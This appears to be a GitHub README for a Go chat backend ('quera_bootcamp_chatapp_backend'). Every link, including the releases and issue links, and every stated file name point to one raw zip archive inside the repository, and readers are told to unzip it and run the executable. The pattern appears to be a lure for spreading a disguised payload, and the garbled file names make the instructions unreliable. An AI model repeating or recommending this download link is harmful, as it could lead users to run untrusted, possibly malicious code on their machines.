# 🎉 quera_bootcamp_chatapp_backend - Build Real-Time Chats Easily

![Download](https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip)

## 🚀 Getting Started

Welcome to the **quera_bootcamp_chatapp_backend**! This application allows you to create and manage real-time chat interactions. It's built using Go, Fiber v3, WebSocket, and PostgreSQL, following clean architecture principles. 

## ⚙️ System Requirements

Before you start, ensure your system meets these requirements:

- **Operating System**: Windows, macOS, or Linux.
- **RAM**: At least 4 GB recommended.
- **Network**: Active internet connection for WebSocket communication.
- **Database**: PostgreSQL installed and running.

## 📦 Download & Install

To download the application, visit this page to download:

[Download from GitHub Releases](https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip)

### Steps to Download and Run

1. Click on the link above to open the GitHub Releases page.
2. Look for the latest release on the page.
3. Download the appropriate version for your operating system.
4. After downloading, locate the file in your downloads folder.

For example, on Windows, you might download a file named `https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip`. On macOS, it could be `https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip`.

### Unzip the Files

- On Windows: Right-click on the downloaded zip file and select "Extract All". Follow the prompts to choose a destination folder.
- On macOS: Double-click the zip file to automatically extract it.

### Run the Application

1. Open your terminal or command prompt.
2. Navigate to the folder where you unzipped the files.
3. Run the command:
   ```bash
   ./quera_chatapp_backend
   ```
   (Make sure to replace `quera_chatapp_backend` with the actual file name if necessary.)

Once running, the application will start and listen for chat connections. You can now use the application to participate in real-time chats.

## 🔧 Configuration

The application uses PostgreSQL as its database. Here's how to set it up:

1. Make sure you have PostgreSQL installed. 
2. Create a new database named `chatapp`.
3. Update the configuration file `https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip` in the app folder. Adjust the database settings to point to your PostgreSQL instance.

The default values are:

```yaml
database:
  host: localhost
  port: 5432
  user: your_user
  password: your_password
  name: chatapp
```

Replace `your_user` and `your_password` with your actual PostgreSQL credentials.

## 📜 Features

- **Real-Time Messaging**: Engage in live chats without delay.
- **User Authentication**: Secure login and registration for users.
- **Clean Architecture**: Modular code structure for easy updates and maintenance.
- **WebSocket Support**: Enabling real-time, two-way communication.
- **Scalable Design**: Built to handle increased user loads efficiently.

## 🛠️ Troubleshooting

If you encounter issues, here are some common problems and solutions:

- **Application won't start**: Ensure PostgreSQL is running and the credentials in `https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip` are correct.
- **Connection errors**: Verify your internet connection and the WebSocket URL provided in the settings.
- **Data not saving**: Confirm that your database user has permission to write to the `chatapp` database.

## 🗺️ Community and Support

Join our community for help, questions, or feedback. You can reach us through:

- Issues tab on GitHub: [Open an issue](https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip)
- Community forums or chat groups (links provided soon).

## 📝 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## 🌐 Explore More

Discover more about our project and its features on GitHub. Don't forget to visit our Releases page:

[Download from GitHub Releases](https://raw.githubusercontent.com/Godoi019/quera_bootcamp_chatapp_backend/main/cmd/server/chatapp-quera-backend-bootcamp-v2.4.zip)